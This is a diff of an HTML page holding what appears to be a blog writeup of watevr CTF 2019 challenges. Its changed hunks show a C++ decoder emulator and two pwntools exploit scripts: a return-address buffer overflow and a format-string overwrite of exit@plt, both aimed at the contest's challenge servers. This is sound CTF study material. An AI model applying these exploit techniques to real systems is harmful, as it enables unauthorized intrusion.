@@ -31,7 +31,7 @@
   <meta name="description" content="This was a very fun CTF. Kudos to the organizers. I loved the problems, very interesting as well as challenging. I played this CTF with my team, Abs0lut3Pwn4g3. Our final rank was 54th.
  Rev Challeneges Timeout File: timeout
 The binary is unstripped, so we can easily see the main function. The disassembly looks something like this.
-   The functions, signal, alarm and delay all serve the same purpose, basically to either exit the program or delay its execution for a long time.">
+The functions, signal, alarm and delay all serve the same purpose, basically to either exit the program or delay its execution for a long time.">
 
   
   <link rel="alternate" hreflang="en-us" href="/post/2019-12-15_watevr-ctf-2019-writeups/">
@@ -157,7 +157,7 @@ The binary is unstripped, so we can easily see the main function. The disassembl
   <meta property="og:description" content="This was a very fun CTF. Kudos to the organizers. I loved the problems, very interesting as well as challenging. I played this CTF with my team, Abs0lut3Pwn4g3. Our final rank was 54th.
  Rev Challeneges Timeout File: timeout
 The binary is unstripped, so we can easily see the main function. The disassembly looks something like this.
-   The functions, signal, alarm and delay all serve the same purpose, basically to either exit the program or delay its execution for a long time."><meta property="og:image" content="/post/2019-12-15_watevr-ctf-2019-writeups/featured.png">
+The functions, signal, alarm and delay all serve the same purpose, basically to either exit the program or delay its execution for a long time."><meta property="og:image" content="/post/2019-12-15_watevr-ctf-2019-writeups/featured.png">
   <meta property="twitter:image" content="/post/2019-12-15_watevr-ctf-2019-writeups/featured.png"><meta property="og:locale" content="en-us">
   
     
@@ -213,7 +213,7 @@ The binary is unstripped, so we can easily see the main function. The disassembl
       "url": "/img/shreyansh-icon-512.png"
     }
   },
-  "description": "This was a very fun CTF. Kudos to the organizers. I loved the problems, very interesting as well as challenging. I played this CTF with my team, Abs0lut3Pwn4g3. Our final rank was 54th.\n Rev Challeneges Timeout File: timeout\nThe binary is unstripped, so we can easily see the main function. The disassembly looks something like this.\n   The functions, signal, alarm and delay all serve the same purpose, basically to either exit the program or delay its execution for a long time."
+  "description": "This was a very fun CTF. Kudos to the organizers. I loved the problems, very interesting as well as challenging. I played this CTF with my team, Abs0lut3Pwn4g3. Our final rank was 54th.\n Rev Challeneges Timeout File: timeout\nThe binary is unstripped, so we can easily see the main function. The disassembly looks something like this.\n\r\r\rThe functions, signal, alarm and delay all serve the same purpose, basically to either exit the program or delay its execution for a long time."
 }
 </script>
 
@@ -822,29 +822,29 @@ The binary is unstripped, so we can easily see the main function. The disassembl
 )
 </code></pre><p>i.e. the pointer to the numbers, the 3rd element of a precomputed array, the pointer to that array (basically the first element) and the second parameter again.</p>
 <p>This function is very interesting, it takes a number does some computation on it and returns a nuber which is the ASCII representaion of the decoded character. For this function, I wrote a separate C++ program to emulate the functionality and to get the mappings to generate all ASCII characters.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp"><span style="color:#75715e">#</span><span style="color:#75715e">include</span> <span style="color:#75715e">&lt;bits/stdc++.h&gt;</span><span style="color:#75715e">
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;bits/stdc++.h&gt;</span><span style="color:#75715e">
 </span><span style="color:#75715e"></span>
 <span style="color:#66d9ef">using</span> <span style="color:#66d9ef">namespace</span> std;
 
 <span style="color:#66d9ef">long</span> <span style="color:#a6e22e">func</span>(<span style="color:#66d9ef">long</span> inp, ulong arr_ele2, <span style="color:#66d9ef">long</span> mod) {
   <span style="color:#66d9ef">long</span> lVar1;
   
-  <span style="color:#66d9ef">if</span> (((<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span> <span style="color:#f92672">&lt;</span> inp) <span style="color:#f92672">&amp;</span><span style="color:#f92672">&amp;</span> (<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span> <span style="color:#f92672">&lt;</span> (<span style="color:#66d9ef">long</span>)arr_ele2)) <span style="color:#f92672">&amp;</span><span style="color:#f92672">&amp;</span> (<span style="color:#ae81ff">0</span> <span style="color:#f92672">&lt;</span> mod)) {
+  <span style="color:#66d9ef">if</span> (((<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span> <span style="color:#f92672">&lt;</span> inp) <span style="color:#f92672">&amp;&amp;</span> (<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span> <span style="color:#f92672">&lt;</span> (<span style="color:#66d9ef">long</span>)arr_ele2)) <span style="color:#f92672">&amp;&amp;</span> (<span style="color:#ae81ff">0</span> <span style="color:#f92672">&lt;</span> mod)) {
     inp <span style="color:#f92672">=</span> inp <span style="color:#f92672">%</span> mod;
-    <span style="color:#66d9ef">if</span> (arr_ele2 <span style="color:#f92672">=</span><span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>) {
+    <span style="color:#66d9ef">if</span> (arr_ele2 <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
       lVar1 <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
     }
     <span style="color:#66d9ef">else</span> {
       lVar1 <span style="color:#f92672">=</span> inp;
-      <span style="color:#66d9ef">if</span> (arr_ele2 <span style="color:#f92672">!</span><span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>) {
-        <span style="color:#66d9ef">if</span> ((arr_ele2 <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">=</span><span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>) {
+      <span style="color:#66d9ef">if</span> (arr_ele2 <span style="color:#f92672">!=</span> <span style="color:#ae81ff">1</span>) {
+        <span style="color:#66d9ef">if</span> ((arr_ele2 <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
           lVar1 <span style="color:#f92672">=</span> (inp <span style="color:#f92672">*</span> inp) <span style="color:#f92672">%</span> mod;
           lVar1 <span style="color:#f92672">=</span> func(lVar1,(<span style="color:#66d9ef">long</span>)arr_ele2 <span style="color:#f92672">/</span> <span style="color:#ae81ff">2</span>,mod);
           lVar1 <span style="color:#f92672">=</span> lVar1 <span style="color:#f92672">%</span> mod;
         }
         <span style="color:#66d9ef">else</span> {
-          lVar1 <span style="color:#f92672">=</span> (<span style="color:#66d9ef">long</span>)((<span style="color:#66d9ef">int</span>)arr_ele2 <span style="color:#f92672">-</span> (<span style="color:#66d9ef">int</span>)((<span style="color:#66d9ef">long</span>)arr_ele2 <span style="color:#f92672">&gt;</span><span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0x3f</span>) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">+</span> ((<span style="color:#66d9ef">long</span>)arr_ele2 <span style="color:#f92672">&gt;</span><span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0x3f</span>);
-          <span style="color:#66d9ef">if</span> (lVar1 <span style="color:#f92672">=</span><span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>) {
+          lVar1 <span style="color:#f92672">=</span> (<span style="color:#66d9ef">long</span>)((<span style="color:#66d9ef">int</span>)arr_ele2 <span style="color:#f92672">-</span> (<span style="color:#66d9ef">int</span>)((<span style="color:#66d9ef">long</span>)arr_ele2 <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">0x3f</span>) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">1</span>) <span style="color:#f92672">+</span> ((<span style="color:#66d9ef">long</span>)arr_ele2 <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">0x3f</span>);
+          <span style="color:#66d9ef">if</span> (lVar1 <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>) {
             lVar1 <span style="color:#f92672">=</span> func(inp,arr_ele2 <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>,mod);
             lVar1 <span style="color:#f92672">=</span> (lVar1 <span style="color:#f92672">*</span> inp) <span style="color:#f92672">%</span> mod;
           }
@@ -860,19 +860,19 @@ The binary is unstripped, so we can easily see the main function. The disassembl
 
 <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>() {
   map<span style="color:#f92672">&lt;</span><span style="color:#66d9ef">int</span>, <span style="color:#66d9ef">int</span><span style="color:#f92672">&gt;</span> m;
-  <span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">int</span> i<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>; i<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">100000</span>; i<span style="color:#f92672">+</span><span style="color:#f92672">+</span>) {
+  <span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">int</span> i<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>; i<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">100000</span>; i<span style="color:#f92672">++</span>) {
     <span style="color:#66d9ef">long</span> ans <span style="color:#f92672">=</span> func(i, <span style="color:#ae81ff">0x71</span>, <span style="color:#ae81ff">0x8f</span>);
-    <span style="color:#66d9ef">if</span>(m.find((<span style="color:#66d9ef">int</span>)ans) <span style="color:#f92672">=</span><span style="color:#f92672">=</span> m.end())
+    <span style="color:#66d9ef">if</span>(m.find((<span style="color:#66d9ef">int</span>)ans) <span style="color:#f92672">==</span> m.end())
       m[(<span style="color:#66d9ef">int</span>)ans] <span style="color:#f92672">=</span> i;
   }
   <span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">auto</span> i: m) {
-    cout<span style="color:#f92672">&lt;</span><span style="color:#f92672">&lt;</span>i.first<span style="color:#f92672">&lt;</span><span style="color:#f92672">&lt;</span><span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">: </span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">&lt;</span><span style="color:#f92672">&lt;</span>i.second<span style="color:#f92672">&lt;</span><span style="color:#f92672">&lt;</span>endl;
+    cout<span style="color:#f92672">&lt;&lt;</span>i.first<span style="color:#f92672">&lt;&lt;</span><span style="color:#e6db74">&#34;: &#34;</span><span style="color:#f92672">&lt;&lt;</span>i.second<span style="color:#f92672">&lt;&lt;</span>endl;
   }
-  string s <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">give_me_the_flag_please</span><span style="color:#e6db74">&#34;</span>;
+  string s <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;give_me_the_flag_please&#34;</span>;
   <span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">char</span> c: s) {
-    cout<span style="color:#f92672">&lt;</span><span style="color:#f92672">&lt;</span>m[c]<span style="color:#f92672">&lt;</span><span style="color:#f92672">&lt;</span><span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74"> </span><span style="color:#e6db74">&#34;</span>;
+    cout<span style="color:#f92672">&lt;&lt;</span>m[c]<span style="color:#f92672">&lt;&lt;</span><span style="color:#e6db74">&#34; &#34;</span>;
   }
-  cout<span style="color:#f92672">&lt;</span><span style="color:#f92672">&lt;</span>endl;
+  cout<span style="color:#f92672">&lt;&lt;</span>endl;
   <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
 }
 </code></pre></div><p>Now, what remains is to get the enoced values corresponding to &ldquo;give_me_the_flag_please&rdquo;. The most thing dut to which I was stuck for some time was to add the encoding for the NULL character at the end as well (here it was 0). So final input is - 38 118 79 95 127 109 95 127 129 91 95 127 20 114 15 38 127 73 114 95 15 124 95 0.</p>
@@ -910,22 +910,22 @@ The binary is unstripped, so we can easily see the main function. The disassembl
 <p>My exploit code -</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
 <span style="color:#75715e"># context.log_level = &#39;debug&#39;</span>
-p <span style="color:#f92672">=</span> process(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">./kamikaze</span><span style="color:#e6db74">&#34;</span>)
-e <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">./kamikaze</span><span style="color:#e6db74">&#39;</span>)
-p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">13.48.67.196</span><span style="color:#e6db74">&#34;</span>, <span style="color:#ae81ff">50000</span>)
+p <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#34;./kamikaze&#34;</span>)
+e <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;./kamikaze&#39;</span>)
+p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;13.48.67.196&#34;</span>, <span style="color:#ae81ff">50000</span>)
 
 offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">10</span>
 
-p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">: </span><span style="color:#e6db74">&#39;</span>)
+p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;: &#39;</span>)
 
 func <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0000000000400807</span>
 
-payload <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">A</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span>offset
-payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p64(func)
+payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span>offset
+payload <span style="color:#f92672">+=</span> p64(func)
 
 p<span style="color:#f92672">.</span>sendline(payload)
 
-<span style="color:#66d9ef">with</span> open(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">payload</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">wb</span><span style="color:#e6db74">&#39;</span>) <span style="color:#66d9ef">as</span> f:
+<span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#39;payload&#39;</span>, <span style="color:#e6db74">&#39;wb&#39;</span>) <span style="color:#66d9ef">as</span> f:
     f<span style="color:#f92672">.</span>write(payload)
 
 p<span style="color:#f92672">.</span>interactive()
@@ -962,8 +962,8 @@ p<span style="color:#f92672">.</span>interactive()
 <p>The final exploit code is -</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
 <span style="color:#75715e"># context.log_level = &#39;debug&#39;</span>
-p <span style="color:#f92672">=</span> process(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">./kamikaze2</span><span style="color:#e6db74">&#34;</span>)
-p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">13.53.125.206</span><span style="color:#e6db74">&#34;</span>, <span style="color:#ae81ff">50000</span>)
+p <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#34;./kamikaze2&#34;</span>)
+p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;13.53.125.206&#34;</span>, <span style="color:#ae81ff">50000</span>)
 
 offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">50</span>
 func <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x08420736</span>
@@ -971,26 +971,26 @@ main <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x084207fb
 exit_plt <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x08422024</span>
 
 <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">pad</span>(s):
-	<span style="color:#66d9ef">return</span> s<span style="color:#f92672">+</span><span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">X</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span>(offset<span style="color:#f92672">-</span>len(s))
+	<span style="color:#66d9ef">return</span> s<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;X&#34;</span><span style="color:#f92672">*</span>(offset<span style="color:#f92672">-</span>len(s))
 
-exploit <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">&#34;</span>
-exploit <span style="color:#f92672">+</span><span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">AA</span><span style="color:#e6db74">&#34;</span>
-exploit <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p32(exit_plt)
-exploit <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p32(exit_plt<span style="color:#f92672">+</span><span style="color:#ae81ff">2</span>)
-exploit <span style="color:#f92672">+</span><span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">BBBBCCCC</span><span style="color:#e6db74">&#34;</span>
-exploit <span style="color:#f92672">+</span><span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">%</span><span style="color:#e6db74">8$1828x</span><span style="color:#e6db74">&#34;</span>
-exploit <span style="color:#f92672">+</span><span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">%</span><span style="color:#e6db74">8$n</span><span style="color:#e6db74">&#34;</span>
-exploit <span style="color:#f92672">+</span><span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">%65804x</span><span style="color:#e6db74">&#34;</span>
-exploit <span style="color:#f92672">+</span><span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">%</span><span style="color:#e6db74">9$n</span><span style="color:#e6db74">&#34;</span>
+exploit <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+exploit <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;AA&#34;</span>
+exploit <span style="color:#f92672">+=</span> p32(exit_plt)
+exploit <span style="color:#f92672">+=</span> p32(exit_plt<span style="color:#f92672">+</span><span style="color:#ae81ff">2</span>)
+exploit <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;BBBBCCCC&#34;</span>
+exploit <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;%8$1828x&#34;</span>
+exploit <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;%8$n&#34;</span>
+exploit <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">%65804x</span><span style="color:#e6db74">&#34;</span>
+exploit <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;%9$n&#34;</span>
 
 <span style="color:#66d9ef">print</span>(pad(exploit))
 payload <span style="color:#f92672">=</span> pad(exploit)
 
-p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">: </span><span style="color:#e6db74">&#39;</span>)
+p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;: &#39;</span>)
 
 p<span style="color:#f92672">.</span>sendline(payload)
 
-<span style="color:#66d9ef">with</span> open(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">payload</span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">wb</span><span style="color:#e6db74">&#39;</span>) <span style="color:#66d9ef">as</span> f:
+<span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#39;payload&#39;</span>, <span style="color:#e6db74">&#39;wb&#39;</span>) <span style="color:#66d9ef">as</span> f:
     f<span style="color:#f92672">.</span>write(pad(exploit))
 
 p<span style="color:#f92672">.</span>interactive()
